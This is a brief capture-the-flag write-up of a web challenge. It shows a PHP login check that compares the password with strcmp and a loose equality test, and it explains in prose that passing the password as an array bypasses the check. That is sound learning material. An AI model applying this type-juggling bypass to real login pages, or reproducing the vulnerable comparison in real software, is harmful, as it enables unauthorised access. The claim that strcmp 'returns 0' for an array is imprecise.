## Challenge

If you could bypass the login you could get the flag. [Link][1]

## Solution

We get to a webpage with a password field and the message `Seems like
your not a haxxor`. We are also given the source:

    <?php
        $FLAGWEB6 = (file_get_contents("flag.txt"));
        $PASSWORD =  (file_get_contents("flag.txt")); //haha
    
        if(isset($_GET['password'])){
    
        if(strcmp($PASSWORD, $_GET['password']) == 0){
                $success = true;
            }
            else{
                $success = false;
            }
        }
        else {
            $success = false;
        }
    ?>
{: .language-php}

we see that they use the `strcmp` function to check the password. We can
bypass this  
by supplying an array named password, instead of a variable, which will
always  
return 0 in the strcmp function.
